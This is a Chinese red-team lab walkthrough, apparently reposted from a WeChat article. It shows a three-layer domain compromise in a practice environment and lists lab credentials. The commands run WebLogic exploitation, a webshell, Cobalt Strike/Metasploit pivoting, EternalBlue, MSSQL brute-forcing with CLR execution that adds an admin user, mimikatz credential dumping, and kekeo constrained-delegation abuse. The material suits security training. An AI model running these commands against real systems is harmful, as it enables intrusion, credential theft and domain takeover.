<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/vhtQ1y2pVgmrR18rilAbig)

网络拓扑图
-----

整个环境共四台目标机，分别处在三层内网环境当中。

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7HKOVUwGrdCOIytniaynY5pbbgFjQmicBWtyHbaxibNWaQXLNEKj04ZjmK5PQabWLFvmMpTSoe9XfvQ/640?wx_fmt=png)

DMZ 区环境 IP 段为 192.168.31.0/24(设置桥接模式)，DMZ 区的靶机拥有两个网卡，一个用来对外提供服务，一个用来连通第二次网络。

第二层网络环境 IP 段为 10.10.20.0/24，第二层网络的靶机同样有两个网卡，一个连通第二层网络，一个连通第三层网络

第三层网络环境 IP 段为 10.10.10.0/24，第三层网络的靶机只有一张网卡，连通第三层网络，包含域控机器与域内服务器

DMZ 区域的主机可以连通外网，第二层与第三层的均不能与外网连接

域控：Windows Server 2008 + IIS + Exchange 2013 邮件服务

目录还原密码：redteam!@#45

主机名：owa

域管理员：administrator:Admin12345

域内服务器 Mssql：Windows Server 2008 + SQL Server 2008 （被配置了非约束委派）

主机名：sqlserver-2008

本地管理员: Administrator:Admin12345

域账户：redteam\sqlserver:Server12345 （被配置了约束委派）

Mssql：sa:sa

域内个人 PC：Windows 7

主机名：work-7

本地管理员: john：admin!@#45

域账户：redteam\saul:admin!@#45

单机服务器：Windows server r2 + weblogic

主机名：weblogic

本地管理员: Administrator:Admin12345 weblogic ：weblogic：weblogic123（访问 http://ip:7001）

weblogic 安装目录：C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain（手动运行下 startWebLogic.cmd）

其他域用户：

域服务账户：redteam\sqlserver:Server12345 （被配置了约束委派）

邮件用户：redteam\mail:admin!@#45

加域账户：redteam\adduser:Add12345 redteam\saulgoodman:Saul12345 （被配置了非约束委派）

redteam\gu:Gu12345

redteam\apt404:Apt12345

本靶场存在的漏洞：

GPP：admin:admin!@#45

存在 GPP 漏洞

存在 MS14-068

存在 CVE-2020-1472

Exchange 各种漏洞都可尝试

可尝试非约束委派

可尝试约束委派

存在 CVE-2019-1388

存在 CVE-2019-0708

外网打点
----

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7HKOVUwGrdCOIytniaynY5pdezHxuYLmHw6ceqNKaUgsBicEuqx7TBgDNcrzVCLQkvoUW44uBKBUlw/640?wx_fmt=png)

使用 Kscan 扫描可以看到使用了 WebLogic, 直接 WebLogic GUI 工具进行批量漏洞检测

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7HKOVUwGrdCOIytniaynY5pJeyWeXQyNk7UP4L5kDFicwk4MzK7cIfq8DdlX4q77LRWAe1yv2s0lsQ/640?wx_fmt=png)

注入内存马

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7HKOVUwGrdCOIytniaynY5pZ4BgRRoXjoZ1WN7EIVAt2oosxHBt4drZLlzeHqhiaDrgW4qlibEf3dAg/640?wx_fmt=png)

蚁剑进行连接

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7HKOVUwGrdCOIytniaynY5pJWVpib6GN9HxNEyfcgLygt71VxUANnwaNUdjSu9jIByj1qVU5FpJlQw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7HKOVUwGrdCOIytniaynY5pvKuN1WB9tXAM6Pq3evPGPbBicibBjaxllicA6MhJb9DKGnicxkCBYibyoLQ/640?wx_fmt=png)

当前权限是 administrator 用户

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7HKOVUwGrdCOIytniaynY5pxfdHfj7G0BV0cXyGraff8ibw0wHBVHsw5DKunOqKJbibHicq6rFiaGJdzg/640?wx_fmt=png)

输入 tasklist, 然后放入在线杀软识别

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7HKOVUwGrdCOIytniaynY5phhRE9lQp9aTt1MnEqkpZ0QP739JYUjor1fM3zl59cXAzCZUwqGAQAA/640?wx_fmt=png)

不存在杀软, 可以 CS 生成马然后上线 CS

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7HKOVUwGrdCOIytniaynY5plLzIfuf74mf1icH9QXicxwx1N1MJr9ickuibewNoVpKv6DuYmiczicOekpFg/640?wx_fmt=png)

蚁剑上传马

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7HKOVUwGrdCOIytniaynY5pX6HyFXVgz5I05nEfrSDeqpoYPnEorKqLn45rMwiamCsttHic9vUtDwIw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7HKOVUwGrdCOIytniaynY5p6wreyZOd7da7ne8pnR4Fns1k5srIicSQicJC9JaEntyPpBGibRfdTwGzA/640?wx_fmt=png)

运行后上线 CS

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7HKOVUwGrdCOIytniaynY5pmOro1QtTXSQVm7t3gKAibPFWoHic91GacH25rTLhhGhP124cj6o9MKmg/640?wx_fmt=png)

目标存在两个网卡，通向内网网段的 10.10.20.0/24，将 CS 联动 MSF，给 MSF 一个 Meterpreter 会话

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7HKOVUwGrdCOIytniaynY5ptVic1VHFIZSlx7jzO6AoVylWRIQ7NibTsKH4YBiaoTxPyQ7Hnvz9D8ZCA/640?wx_fmt=png)

在 CS 已获得的 shell 右键新增会话进行设置

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7HKOVUwGrdCOIytniaynY5pDGCm0hxBWZ9Ah6oGFibvB3ribTnr7fFcgWUKsWd79vXqg71EqQjI4BtQ/640?wx_fmt=png)

MSF 设置监听

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7HKOVUwGrdCOIytniaynY5p2P6d0Pd09XjeQCMkTEo2lGIicC9vvBTTBEh5nXRmSn7tZnO4ia6dbgdw/640?wx_fmt=png)

这里由于是 administrator 用户, 所以可以直接 getsystem 进行提权

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7HKOVUwGrdCOIytniaynY5pFc2uk5HNiaKKYk4DhQibaLjc1EjaaxKPP1K14yebkhYuwmTiaJ9M0nE6A/640?wx_fmt=png)

内网横向移动
------

在以获得的 Meterpreter 会话上传 Fscan

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7HKOVUwGrdCOIytniaynY5pdqibPjM7YiasKF4NSXZ3mozibtrutAYmlzbqCwZTF2WDu8qPHIfFtK8uQ/640?wx_fmt=png)

```
fscan32.exe -h 10.10.20.0/24


```

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7HKOVUwGrdCOIytniaynY5pcns3gqXQgqRPchGrOURFUGuNB3Bn2GtXEZdc7yRG91iaNrxXFwAKh5A/640?wx_fmt=png)

10.10.20.129 这台 Windows7 存在永恒之蓝漏洞, 将 MSF 添加路由, 通向 10.10.20.0 网段

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7HKOVUwGrdCOIytniaynY5pbib42kHDhI23cEkY4RA5xManR08tkcQXVR4tpBa8zByeUOY4l9GXYsg/640?wx_fmt=png)

现在可以利用 exploit/windows/smb/ms17_010_eternalblue 进行攻击, 拿下该机器

```
search ms17-010
set payload windows/x64/meterpreter/bind_tcp
set lport 7778
set rhosts 10.10.20.129
exploit


```

第一次攻击失败了，win7 蓝屏了，重新尝试，成功

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7HKOVUwGrdCOIytniaynY5pm5LGDbDO0NDdSzmVKNgbPjuQgKjt7E6MfYOH3Cz5XUbQ9bpicibaHhfg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7HKOVUwGrdCOIytniaynY5pfxibJ2hgyFwvZkafEmL7kqgKdPj7homU0bYeHRhJAzUOCn1X2lLwgGw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7HKOVUwGrdCOIytniaynY5pZUeIjFeKX2HUcDpq40xxWKdZBkISuGN606sDyFLk3DGQXzRCdfmtkA/640?wx_fmt=png)

查看网卡存在另一个网段 10.10.10.0/24，MSF 继续添加路由

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7HKOVUwGrdCOIytniaynY5pH4tSzNTMvengkFLD5XmYb5JxpwXb9tYv8RxzckEG8hHjbqpN8zmf4A/640?wx_fmt=png)

域内信息收集与域渗透
----------

```
net config Workstation
查看计算机名、全名、用户名、系统版本、工作站、域、登录域 
net user
查看本机用户列表
net user /domain
查看域用户
net localgroup administrators
查看本地管理员组
net view /domain
查看有几个域
net user 用户名 /domain
获取指定域用户的信息
net group /domain
查看域里面的工作组，查看把用户分了多少组（只能在域控上操作
net group 组名 /domain
查看域中某工作组
net group "domain admins" /domain
查看域管理员的名字
net group "domain computers" /domain
查看域中的其他主机名
net group "doamin controllers" /domain(然后ping 域控的域名获得IP地址)


```

可以确定我们所在 redteam 域，域用户有: saul，sqlserver，mail，adduser，saulgoodman，gu,apt404

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7HKOVUwGrdCOIytniaynY5pz0iaW4IhasdYwS7D7y4prEKOy5DJoZiaRakrmcDC1N7Ne5YfviaovPBaw/640?wx_fmt=png)

在当前 Windows7 加载 mimiktaz

```
creds_all #列举所有凭据


```

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7HKOVUwGrdCOIytniaynY5pZoC04lpneHShhSe6GCtOLStHQFLw6F1hUX9AMibxicYwYSYT9sbn6ibUw/640?wx_fmt=png)

得到普通域用户 saul 的密码，在上传 Fscan 扫描 10.10.10.129 是 SQlServer 服务器

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7HKOVUwGrdCOIytniaynY5ps94sGS8Dnd9dxXkrRgAsukyRkXXY9QPQMbmhvaRd4NwBUfRkWojK0w/640?wx_fmt=png)

我们可以尝试下 SQLServer 弱口令爆破，MSF 设置如下:

```
search mssql_login
use auxiliary/scanner/mssql/mssql_login
set RHOSTS 10.10.10.129 //设置攻击目标
set THREADS 5 //设置线程
set USERNAME sa //设置数据库用户名，mssql默认最高权限为sa
set PASS_FILE /root/pass.txt //设置爆破字典，字典强成功率高
run


```

获得账号 sa, 密码 sa, 在 MSF 处设置 Socks5

```
search socks
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
vim /etc/proxychains4.conf
socks5 127.0.0.1 1080


```

随后使用工具 SharpSQLTools 进行提权, github 地址: https://github.com/Ridter/PySQLTool

```
proxychains python PySQLTools.py sa:'sa'@10.10.10.129


```

然后尝试 xp_cmdshell 提权, 后续只有 clr 可以提权成功

```
enable_clr 
clr_exec {cmd}


```

添加管理员, 添加一个管理员权限用户，用户名为 ocean.com 密码为 qwe.123, 然后加入管理员组

```
proxychains python PySQLTools.py sa:'sa'@10.10.10.129
enable_clr
clr_exec 'net user ocean.com qwe.123 /add'
clr_exec 'net localgroup administrators ocean.com /add'


```

后面远程桌面连接, 直接 copy MSF 的正向木马上线 SQL Server 这台机器, 上传 Adfind，查找配置了约束委派的用户

查询配置了非约束委派的主机：

```
AdFind.exe -h 10.10.10.8 -u saul -up admin!@#45 -b "DC=redteam,DC=red" -f "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName
查询配置了非约束委派的用户：AdFind.exe -h 10.10.10.8 -u saul -up admin!@#45 -b "DC=redteam,DC=red" -f "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName
查询配置了约束委派的主机：AdFind.exe -h 10.10.10.8 -u saul -up admin!@#45 -b "DC=redteam,DC=red" -f "(&(samAccountType=805306369)(msds-allowedtodelegateto=*))" cn distinguishedName msds-allowedtodelegateto
查询配置了约束委派的用户：AdFind.exe -h 10.10.10.8 -u saul -up admin!@#45 -b "DC=redteam,DC=red" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" cn distinguishedName msds-allowedtodelegateto


```

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7HKOVUwGrdCOIytniaynY5pvzMuDBwm2lTOTJnKRAbsBrynQ7k2AAs4icVCjNEDYiaficLjZ2RwqfTLA/640?wx_fmt=png)

可通过 SQLServer 拿下域控制器, mimikatz 加载获得 SQLServer 的凭证

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7HKOVUwGrdCOIytniaynY5pDjopJKPkWrbeGsZBYSMiaYTwiagZ9grnJDN5Kj5Oo665ZQibzhdqW7pWQ/640?wx_fmt=png)

上传工具 kekeo，利用 kekeo 请求该用户的 TGT：

```
kekeo.exe "tgt::ask /user:sqlserver /domain:redteam.red /password:Server12345 /ticket:administrator.kirbi" > 1.txt
生成的
TGT_sqlserver@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi获取域机器的ST:

kekeo.exe "tgs::s4u /tgt:TGT_sqlserver@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:cifs/owa.redteam.red" > 2.txt

使用 mimikatz 将 ST2 导入当前会话即可，运行 mimikatz 进行 ptt
mimikatz kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_cifs~owa.redteam.red@REDTEAM.RED.kirbi


```

拿下域控制器, 三层域渗透结束

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7HKOVUwGrdCOIytniaynY5p09AicpqTfibic9DwhVBC1SODSJzD4lI5ZLzQoibVnMiaXBV74pOOIW0kMCg/640?wx_fmt=png)

**文章来源于：https://xz.aliyun.com/t/12259**

**若有侵权请联系删除**

加下方 wx，拉你一起进群学习

![](https://mmbiz.qpic.cn/mmbiz_jpg/ibZ6uZjjH3v4WZgYJeibL4XoXol2MibfTeNPUTuUmqkgMFFf3icptn2CEN5kJEOOPWMg7STl235fSLQMgQ8GuSmWSg/640?wx_fmt=jpeg)

往期推荐

[

域内令牌窃取



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247506691&idx=1&sn=ac9f19fbc2155c032a02d75c065b6f75&chksm=ce6761bff910e8a9ba231adfce7b847116d3eb760fb702c3cce0de98e6edd308567ac827e7ba&scene=21#wechat_redirect)

[

最简单绕过 ring3 hook 的方式（bypass bitdefender）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247506674&idx=1&sn=09e05891a69e9b2a9c5cf53893a15ab8&chksm=ce67604ef910e95855c426fbfa60d95528d6ee79c24e7125e8673ea81112150f122db16bad2d&scene=21#wechat_redirect)

[

域内定位个人 PC 的三种方式



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247506246&idx=1&sn=dee60e5e6a859f8679f5f131d7a26db6&chksm=ce6763faf910eaec76028bad4f8c9b1ebf69836562d64b9e65528fb577ae3d852f3f9bbcc8d6&scene=21#wechat_redirect)

[

基于资源的约束委派（RBCD）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247506155&idx=1&sn=9f42794f32d4210b16da8ed7734015d4&chksm=ce676257f910eb41a0c9749709ae10b8012bf69e8f25625440b284d831013fd0c48a0e7a039b&scene=21#wechat_redirect)

[

syscall 的检测与绕过



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247505816&idx=1&sn=621788407279fb5351fff3b5c725adfd&chksm=ce676d24f910e432cf03edc058c68c2202d6a4e890f70ac3996f4255011344b1954ec9c8ee17&scene=21#wechat_redirect)

[

DLL 劫持之 IAT 类型



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247506149&idx=1&sn=9059fa64c657c82ba679a237602f3b40&chksm=ce676259f910eb4f1a2c76088a92581a546133838f24ec7a231a97cdfab3d7e31f1a38783d9f&scene=21#wechat_redirect)

[

patchless amsi 学习



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247505779&idx=1&sn=7a5c79f8f961accc46000ca0c8a60c64&chksm=ce676dcff910e4d961e903988cd3490a0c7bf673e0cee4e85b8623a4474b9a2b13510062b80b&scene=21#wechat_redirect)

[绕过 windows defender 上线 cs](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247504303&idx=1&sn=7716a681734b6841023982e670efd47d&chksm=ce676b13f910e205e297694a7bc960f71f615a8a8663409b79bdad1650b71496fcf36d40244f&scene=21#wechat_redirect)

    ![](https://mmbiz.qpic.cn/mmbiz_gif/ibZ6uZjjH3v7LQZwTb4qED3KvozKicnJd9ejpVoCntCRqf53IiaK2T3myzcUn5sswkUPfpQj1KHAALFcMFNYjfriaw/640?wx_fmt=gif)